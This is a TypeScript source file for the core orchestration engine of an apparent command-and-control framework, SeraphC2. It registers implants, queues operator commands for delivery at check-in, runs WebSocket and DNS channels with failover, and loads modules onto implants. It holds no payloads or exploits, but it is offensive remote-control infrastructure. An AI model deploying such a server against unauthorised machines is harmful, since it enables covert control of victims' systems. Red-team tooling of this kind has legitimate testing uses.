/**
 * C2Engine - Core orchestration engine for SeraphC2
 * Implements requirements 1.2, 1.3, 1.4, 7.9, and 8.1 from the SeraphC2 specification
 */

import { EventEmitter } from 'events';
import { ImplantManager, ImplantRegistrationData, HeartbeatData } from './implant-manager';
import { CommandRouter } from './command-router';
import { RepositoryFactory } from '../repositories/interfaces';
import {
  Implant,
  Command,
  CommandType,
  CommandResult,
  CommandStatus,
  Protocol,
} from '../../types/entities';
import { Logger } from '../../utils/logger';
import {
  ProtocolManager,
  MessageRouter,
  WebSocketHandler,
  DNSHandler,
  ProtocolMessage,
  ProtocolFailoverConfig,
  WebSocketConfig,
  DNSConfig,
} from '../../protocols';
import { ModuleManager, ModuleManagerConfig } from '../modules/module-manager';
import {
  ModuleLoadRequest,
  ModuleExecuteRequest,
  ModuleUnloadRequest,
  ModuleListFilter,
  ModuleExecutionFilter,
  ModuleExecutionResult,
} from '../../types/modules';

export interface C2EngineConfig {
  heartbeatInterval?: number;
  inactivityThreshold?: number;
  commandTimeout?: number;
  maxCommandRetries?: number;
  protocols?: {
    websocket?: WebSocketConfig;
    dns?: DNSConfig;
    failover?: ProtocolFailoverConfig;
  };
  modules?: ModuleManagerConfig;
}

export interface C2EngineStats {
  implants: {
    total: number;
    active: number;
    inactive: number;
    disconnected: number;
  };
  commands: {
    total: number;
    pending: number;
    executing: number;
    completed: number;
    failed: number;
  };
  queues: { [implantId: string]: number };
}

export class C2Engine extends EventEmitter {
  private implantManager: ImplantManager;
  private commandRouter: CommandRouter;
  private protocolManager: ProtocolManager;
  private messageRouter: MessageRouter;
  private moduleManager: ModuleManager;
  private logger: Logger;
  private isRunning: boolean;
  private httpServer?: any; // HTTP server for WebSocket handler

  constructor(
    repositoryFactory?: RepositoryFactory,
    config: C2EngineConfig = {},
    httpServer?: any
  ) {
    super();

    this.logger = Logger.getInstance();
    this.isRunning = false;
    this.httpServer = httpServer;

    // Initialize components
    this.implantManager = new ImplantManager(
      repositoryFactory?.getImplantRepository(),
      config.heartbeatInterval,
      config.inactivityThreshold
    );

    this.commandRouter = new CommandRouter(
      this.implantManager,
      repositoryFactory?.getCommandRepository(),
      config.commandTimeout,
      config.maxCommandRetries
    );

    // Initialize protocol system
    this.messageRouter = new MessageRouter();

    const failoverConfig: ProtocolFailoverConfig = config.protocols?.failover || {
      enabled: true,
      primaryProtocol: Protocol.WEBSOCKET,
      fallbackProtocols: [Protocol.DNS, Protocol.HTTP],
      healthCheckInterval: 30000,
      failureThreshold: 3,
      recoveryThreshold: 2,
    };

    this.protocolManager = new ProtocolManager(failoverConfig);

    // Initialize module system
    this.moduleManager = new ModuleManager(config.modules);

    this.setupEventHandlers();
    this.setupProtocolHandlers(config);
    this.setupMessageHandlers();
  }

  /**
   * Start the C2 engine
   */
  async start(): Promise<void> {
    if (this.isRunning) {
      throw new Error('C2Engine is already running');
    }

    try {
      this.logger.info('Starting C2Engine with multi-protocol support and module system');

      // Start protocol manager (this will start all registered protocol handlers)
      await this.protocolManager.start();

      // Initialize module system
      await this.moduleManager.initialize();

      // The ImplantManager starts heartbeat monitoring in its constructor
      // The CommandRouter is ready to accept commands

      this.isRunning = true;

      this.emit('engineStarted');
      this.logger.info('C2Engine started successfully with protocols:', {
        availableProtocols: this.protocolManager.getAvailableProtocols(),
      });
    } catch (error) {
      this.logger.error(
        'C2 engine operation failed',
        error instanceof Error ? error : new Error('Unknown error')
      );
      throw error;
    }
  }

  /**
   * Stop the C2 engine
   */
  async stop(): Promise<void> {
    if (!this.isRunning) {
      return;
    }

    try {
      this.logger.info('Stopping C2Engine');

      // Stop protocol manager first
      await this.protocolManager.stop();

      // Stop module system
      await this.moduleManager.shutdown();

      // Stop components
      this.implantManager.stop();
      this.commandRouter.stop();

      this.isRunning = false;

      this.emit('engineStopped');
      this.logger.info('C2Engine stopped successfully');
    } catch (error) {
      this.logger.error(
        'C2 engine operation failed',
        error instanceof Error ? error : new Error('Unknown error')
      );
      throw error;
    }
  }

  /**
   * Register a new implant
   */
  async registerImplant(data: ImplantRegistrationData): Promise<Implant> {
    this.ensureRunning();
    return this.implantManager.registerImplant(data);
  }

  /**
   * Process heartbeat from an implant
   */
  async processHeartbeat(data: HeartbeatData): Promise<void> {
    this.ensureRunning();
    return this.implantManager.processHeartbeat(data);
  }

  /**
   * Execute a command on an implant
   */
  async executeCommand(
    implantId: string,
    operatorId: string,
    type: CommandType,
    payload: string,
    priority: number = 0
  ): Promise<Command> {
    this.ensureRunning();
    return this.commandRouter.queueCommand(implantId, operatorId, type, payload, priority);
  }

  /**
   * Get pending commands for an implant (used by implant check-ins)
   */
  async getPendingCommands(implantId: string): Promise<Command[]> {
    this.ensureRunning();
    return this.commandRouter.getPendingCommands(implantId);
  }

  /**
   * Start command execution (called when implant begins executing)
   */
  async startCommandExecution(commandId: string, timeout?: number): Promise<void> {
    this.ensureRunning();
    return this.commandRouter.startCommandExecution(commandId, timeout);
  }

  /**
   * Complete command execution with result
   */
  async completeCommandExecution(
    commandId: string,
    result: CommandResult,
    status: CommandStatus = CommandStatus.COMPLETED
  ): Promise<void> {
    this.ensureRunning();
    return this.commandRouter.completeCommandExecution(commandId, result, status);
  }

  /**
   * Fail command execution
   */
  async failCommandExecution(commandId: string, errorMessage: string): Promise<void> {
    this.ensureRunning();
    return this.commandRouter.failCommandExecution(commandId, errorMessage);
  }

  /**
   * Cancel a command
   */
  async cancelCommand(commandId: string): Promise<void> {
    this.ensureRunning();
    return this.commandRouter.cancelCommand(commandId);
  }

  /**
   * Get command status
   */
  async getCommandStatus(commandId: string): Promise<Command | null> {
    this.ensureRunning();
    return this.commandRouter.getCommandStatus(commandId);
  }

  /**
   * Get command history for an implant
   */
  async getCommandHistory(
    implantId: string,
    limit: number = 50,
    offset: number = 0
  ): Promise<Command[]> {
    this.ensureRunning();
    return this.commandRouter.getCommandHistory(implantId, limit, offset);
  }

  /**
   * Disconnect an implant
   */
  async disconnectImplant(implantId: string, reason: string = 'Manual disconnect'): Promise<void> {
    this.ensureRunning();
    return this.implantManager.disconnectImplant(implantId, reason);
  }

  /**
   * Get implant by ID
   */
  async getImplant(implantId: string): Promise<Implant | null> {
    this.ensureRunning();
    return this.implantManager.getImplant(implantId);
  }

  /**
   * Get all implants
   */
  async getAllImplants(): Promise<Implant[]> {
    this.ensureRunning();
    return this.implantManager.getAllImplants();
  }

  /**
   * Get active implants
   */
  async getActiveImplants(): Promise<Implant[]> {
    this.ensureRunning();
    return this.implantManager.getActiveImplants();
  }

  /**
   * Check if implant is active
   */
  isImplantActive(implantId: string): boolean {
    this.ensureRunning();
    return this.implantManager.isImplantActive(implantId);
  }

  /**
   * Get implant session information
   */
  getImplantSession(implantId: string) {
    this.ensureRunning();
    return this.implantManager.getImplantSession(implantId);
  }

  /**
   * Get all active sessions
   */
  getActiveSessions() {
    this.ensureRunning();
    return this.implantManager.getActiveSessions();
  }

  /**
   * Get comprehensive engine statistics
   */
  async getEngineStats(): Promise<C2EngineStats> {
    this.ensureRunning();

    const implantStats = await this.implantManager.getImplantStats();
    const queueStats = this.commandRouter.getQueueStats();

    // Get command statistics from repository
    const commandRepository = this.commandRouter['commandRepository'];
    const allCommands = await commandRepository.findAll();

    const commandStats = {
      total: allCommands.length,
      pending: allCommands.filter(c => c.status === CommandStatus.PENDING).length,
      executing: allCommands.filter(c => c.status === CommandStatus.EXECUTING).length,
      completed: allCommands.filter(c => c.status === CommandStatus.COMPLETED).length,
      failed: allCommands.filter(c => c.status === CommandStatus.FAILED).length,
    };

    return {
      implants: implantStats,
      commands: commandStats,
      queues: queueStats,
    };
  }

  /**
   * Get engine status
   */
  getStatus(): {
    isRunning: boolean;
    startTime?: Date;
    uptime?: number;
  } {
    return {
      isRunning: this.isRunning,
      // Add startTime and uptime tracking if needed
    };
  }

  /**
   * Setup protocol handlers based on configuration
   */
  private setupProtocolHandlers(config: C2EngineConfig): void {
    // Setup WebSocket handler if configured and HTTP server is available
    if (config.protocols?.websocket && this.httpServer) {
      const wsHandler = new WebSocketHandler(config.protocols.websocket);
      this.protocolManager.registerHandler(Protocol.WEBSOCKET, wsHandler);
    }

    // Setup DNS handler if configured
    if (config.protocols?.dns) {
      const dnsHandler = new DNSHandler(config.protocols.dns);
      this.protocolManager.registerHandler(Protocol.DNS, dnsHandler);
    }

    this.logger.info('Protocol handlers configured', {
      websocket: !!config.protocols?.websocket,
      dns: !!config.protocols?.dns,
    });
  }

  /**
   * Setup message handlers for different message types
   */
  private setupMessageHandlers(): void {
    // Handle implant registration messages
    this.messageRouter.registerHandler('registration', async (message, connectionInfo) => {
      try {
        const registrationData: ImplantRegistrationData = {
          ...message.payload,
          remoteAddress: connectionInfo.remoteAddress,
          userAgent: connectionInfo.userAgent,
        };

        const implant = await this.implantManager.registerImplant(registrationData);

        // Send registration acknowledgment
        const ackMessage = this.messageRouter.createMessage('response', implant.id, {
          type: 'registration_ack',
          implantId: implant.id,
        });

        await this.protocolManager.sendMessage(implant.id, ackMessage, connectionInfo.protocol);
      } catch (error) {
        this.logger.error(
          'C2 engine operation failed',
          error instanceof Error ? error : new Error('Unknown error')
        );
      }
    });

    // Handle heartbeat messages
    this.messageRouter.registerHandler('heartbeat', async (message, connectionInfo) => {
      try {
        const heartbeatData: HeartbeatData = {
          implantId: message.implantId,
          systemInfo: message.payload.systemInfo,
          protocol: connectionInfo.protocol,
          remoteAddress: connectionInfo.remoteAddress,
          userAgent: connectionInfo.userAgent,
        };

        await this.implantManager.processHeartbeat(heartbeatData);

        // Send pending commands if any
        const pendingCommands = await this.commandRouter.getPendingCommands(message.implantId);

        if (pendingCommands.length > 0) {
          for (const command of pendingCommands) {
            const commandMessage = this.messageRouter.createMessage('command', command.implantId, {
              commandId: command.id,
              type: command.type,
              payload: command.payload,
            });

            await this.protocolManager.sendMessage(
              command.implantId,
              commandMessage,
              connectionInfo.protocol
            );
            await this.commandRouter.startCommandExecution(command.id);
          }
        }
      } catch (error) {
        this.logger.error(
          'C2 engine operation failed',
          error instanceof Error ? error : new Error('Unknown error')
        );
      }
    });

    // Handle command response messages
    this.messageRouter.registerHandler('response', async (message, connectionInfo) => {
      try {
        const { commandId, result, status } = message.payload;

        if (status === 'completed') {
          await this.commandRouter.completeCommandExecution(commandId, result);
        } else if (status === 'failed') {
          await this.commandRouter.failCommandExecution(
            commandId,
            result.stderr || 'Command failed'
          );
        }
      } catch (error) {
        this.logger.error(
          'C2 engine operation failed',
          error instanceof Error ? error : new Error('Unknown error')
        );
      }
    });
  }

  /**
   * Setup event handlers to forward events from components
   */
  private setupEventHandlers(): void {
    // Forward ImplantManager events
    this.implantManager.on('implantRegistered', data => {
      this.emit('implantRegistered', data);
    });

    this.implantManager.on('heartbeatReceived', data => {
      this.emit('heartbeatReceived', data);
    });

    this.implantManager.on('implantDisconnected', data => {
      this.emit('implantDisconnected', data);
    });

    this.implantManager.on('implantInactive', data => {
      this.emit('implantInactive', data);
    });

    // Forward CommandRouter events
    this.commandRouter.on('commandQueued', data => {
      this.emit('commandQueued', data);
    });

    this.commandRouter.on('commandExecutionStarted', data => {
      this.emit('commandExecutionStarted', data);
    });

    this.commandRouter.on('commandExecutionCompleted', data => {
      this.emit('commandExecutionCompleted', data);
    });

    this.commandRouter.on('commandExecutionFailed', data => {
      this.emit('commandExecutionFailed', data);
    });

    this.commandRouter.on('commandTimeout', data => {
      this.emit('commandTimeout', data);
    });

    this.commandRouter.on('commandCancelled', data => {
      this.emit('commandCancelled', data);
    });

    // Forward ProtocolManager events
    this.protocolManager.on('implantConnected', data => {
      this.emit('protocolImplantConnected', data);
    });

    this.protocolManager.on('implantDisconnected', data => {
      this.emit('protocolImplantDisconnected', data);
    });

    this.protocolManager.on('messageReceived', async data => {
      try {
        await this.messageRouter.routeMessage(data.message, data.connectionInfo);
      } catch (error) {
        this.logger.error(
          'C2 engine operation failed',
          error instanceof Error ? error : new Error('Unknown error')
        );
      }
    });

    this.protocolManager.on('protocolFailover', data => {
      this.emit('protocolFailover', data);
    });

    this.protocolManager.on('protocolError', data => {
      this.emit('protocolError', data);
    });

    // Forward ModuleManager events
    this.moduleManager.on('moduleRegistered', data => {
      this.emit('moduleRegistered', data);
    });

    this.moduleManager.on('moduleUnregistered', data => {
      this.emit('moduleUnregistered', data);
    });

    this.moduleManager.on('moduleLoaded', data => {
      this.emit('moduleLoaded', data);
    });

    this.moduleManager.on('moduleUnloaded', data => {
      this.emit('moduleUnloaded', data);
    });

    this.moduleManager.on('moduleExecutionStarted', data => {
      this.emit('moduleExecutionStarted', data);
    });

    this.moduleManager.on('moduleExecutionCompleted', data => {
      this.emit('moduleExecutionCompleted', data);
    });

    this.moduleManager.on('moduleExecutionFailed', data => {
      this.emit('moduleExecutionFailed', data);
    });
  }

  /**
   * Get protocol manager instance
   */
  getProtocolManager(): ProtocolManager {
    this.ensureRunning();
    return this.protocolManager;
  }

  /**
   * Get message router instance
   */
  getMessageRouter(): MessageRouter {
    this.ensureRunning();
    return this.messageRouter;
  }

  /**
   * Get available communication protocols
   */
  getAvailableProtocols(): Protocol[] {
    this.ensureRunning();
    return this.protocolManager.getAvailableProtocols();
  }

  /**
   * Get protocol statistics
   */
  getProtocolStats(): any[] {
    this.ensureRunning();
    return this.protocolManager.getProtocolStats();
  }

  /**
   * Get protocol health status
   */
  getProtocolHealth(): any[] {
    this.ensureRunning();
    const health = this.protocolManager.getProtocolHealth();
    return Object.entries(health).map(([protocol, status]) => ({
      protocol,
      ...status,
    }));
  }

  /**
   * Force protocol failover for specific implant
   */
  async forceProtocolFailover(implantId: string, targetProtocol?: Protocol): Promise<boolean> {
    this.ensureRunning();
    return this.protocolManager.forceFailover(implantId, targetProtocol);
  }

  /**
   * Send message to implant via protocol manager
   */
  async sendProtocolMessage(
    implantId: string,
    message: ProtocolMessage,
    preferredProtocol?: Protocol
  ): Promise<boolean> {
    this.ensureRunning();
    return this.protocolManager.sendMessage(implantId, message, preferredProtocol);
  }

  /**
   * Check if implant is connected via any protocol
   */
  isImplantConnectedViaProtocol(implantId: string): boolean {
    this.ensureRunning();
    return this.protocolManager.isImplantConnected(implantId);
  }

  /**
   * Get implant connection info from protocol manager
   */
  getImplantProtocolConnection(implantId: string): any {
    this.ensureRunning();
    return this.protocolManager.getImplantConnection(implantId);
  }

  // Module Management Methods

  /**
   * Load a module on an implant
   */
  async loadModule(request: ModuleLoadRequest): Promise<void> {
    this.ensureRunning();
    return this.moduleManager.loadModule(request);
  }

  /**
   * Execute a module capability
   */
  async executeModule(request: ModuleExecuteRequest): Promise<ModuleExecutionResult> {
    this.ensureRunning();
    return this.moduleManager.executeModule(request);
  }

  /**
   * Unload a module from an implant
   */
  async unloadModule(request: ModuleUnloadRequest): Promise<void> {
    this.ensureRunning();
    return this.moduleManager.unloadModule(request);
  }

  /**
   * List available modules
   */
  listModules(filter?: ModuleListFilter) {
    this.ensureRunning();
    return this.moduleManager.listModules(filter);
  }

  /**
   * Get module details
   */
  getModule(moduleId: string) {
    this.ensureRunning();
    return this.moduleManager.getModule(moduleId);
  }

  /**
   * Get loaded modules
   */
  getLoadedModules() {
    this.ensureRunning();
    return this.moduleManager.getLoadedModules();
  }

  /**
   * Get module executions
   */
  getModuleExecutions(filter?: ModuleExecutionFilter) {
    this.ensureRunning();
    return this.moduleManager.getModuleExecutions(filter);
  }

  /**
   * Get module statistics
   */
  getModuleStats() {
    this.ensureRunning();
    return this.moduleManager.getModuleStats();
  }

  /**
   * Get module manager instance
   */
  getModuleManager(): ModuleManager {
    this.ensureRunning();
    return this.moduleManager;
  }

  /**
   * Ensure the engine is running
   */
  private ensureRunning(): void {
    if (!this.isRunning) {
      throw new Error('C2Engine is not running. Call start() first.');
    }
  }
}
